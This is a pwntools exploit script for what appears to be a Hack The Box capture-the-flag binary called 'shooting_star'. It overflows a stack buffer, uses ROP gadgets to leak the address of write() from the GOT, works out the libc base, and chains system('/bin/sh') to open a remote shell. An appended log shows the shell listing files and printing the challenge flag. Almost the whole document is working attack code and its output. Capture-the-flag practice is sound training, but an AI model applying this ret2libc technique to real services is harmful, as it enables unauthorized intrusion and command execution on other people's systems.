from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

#io = process('./shooting_star')
ip, port = '165.227.237.190', 30652
io = remote(ip, port)

elf = ELF('./shooting_star')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc6_2.27-3ubuntu1.4_amd64.so')

io.sendlineafter('>', '1')

pop_rdi_ret = 0x00000000004012cb
pop_rsi_r15_ret = 0x00000000004012c9

padding = b'A'*(64+8)
payload = padding
payload += p64(pop_rdi_ret)
payload += p64(1)
payload += p64(pop_rsi_r15_ret)
payload += p64(elf.got.write)
payload += p64(0)
payload += p64(elf.sym.write)
payload += p64(elf.sym.main)
io.sendlineafter('>>', payload)
io.recvuntil('\n')
io.recvuntil('\n')
#print hex(u64(io.recv(6).ljust(8, b'\x00')))
#gdb ./shooting_star -> b main -> r -> disassemble read to verify
write_addr = u64(io.recv(6).ljust(8, b'\x00'))
log.info("Leaked server's libc address, write(): "+hex(write_addr))

'''
Connect to server and get server side write address, search in https://libc.blukat.me/
In Ubuntu 20.04/18.04, can successfully get write address from remote, 22.04 failed!
write -> 0x7f3264f27210
libc-2.20-26.mga5.i586_2
libc-2.20-27.mga5.i586_2
libc-2.29-20.mga7.x86_64_2
libc6-i386_2.30-0ubuntu2_amd64
libc6-x32_2.17-0ubuntu5_amd64
libc6-x32_2.17-0ubuntu5_i386
libc6_2.26-0ubuntu2.1_i386
libc6_2.27-3ubuntu1.4_amd64
'''

server_libc_base = write_addr - libc.sym.write
log.info("Leaked server's libc base address: "+hex(server_libc_base))

libc.address = server_libc_base

rop_libc = ROP(libc)
#rop_libc.call((rop_libc.find_gadget(['ret']))[0])  #!!Padding/16 bytes!
rop_libc.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
payload2 = padding + rop_libc.chain()

io.sendlineafter('>', '1')
io.sendlineafter('>>', payload2)
io.interactive()
'''
May your wish come true!
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x28 bytes:
    b'flag.txt\n'
    b'run_challenge.sh\n'
    b'shooting_star\n'
flag.txt
run_challenge.sh
shooting_star
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x1e bytes:
    b'HTB{1_w1sh_pwn_w4s_th1s_e4sy}\n'
HTB{1_w1sh_pwn_w4s_th1s_e4sy}

'''
